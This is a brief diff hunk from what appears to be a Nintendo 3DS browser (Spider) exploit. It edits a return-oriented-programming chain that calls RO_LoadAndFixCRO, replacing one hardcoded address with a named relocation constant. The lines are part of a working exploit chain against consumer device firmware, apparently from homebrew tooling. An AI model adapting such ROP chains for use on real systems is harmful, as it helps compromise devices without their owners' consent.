@@ -294,7 +294,7 @@ thread0rop:
 			.word 0xDEADC0DE ; r4 (garbage)
 		.word 0x002C5D58 ; RO_LoadAndFixCRO
 			.word SPIDER_CROSIZE ; arg_0 (SPIDER_CROSIZE) (r4)
-			.word 0x08381050 ; arg_4 (data1addr) (r5)
+			.word CRO_RELOCATION_OFFSET ; arg_4 (data1addr) (r5)
 			.word 0x00000000 ; arg_8 (r6)
 			.word 0x00006630 ; arg_C (a) (r7)
 			.word 0x08387680 ; arg_10 (dataaddr2) (r8)
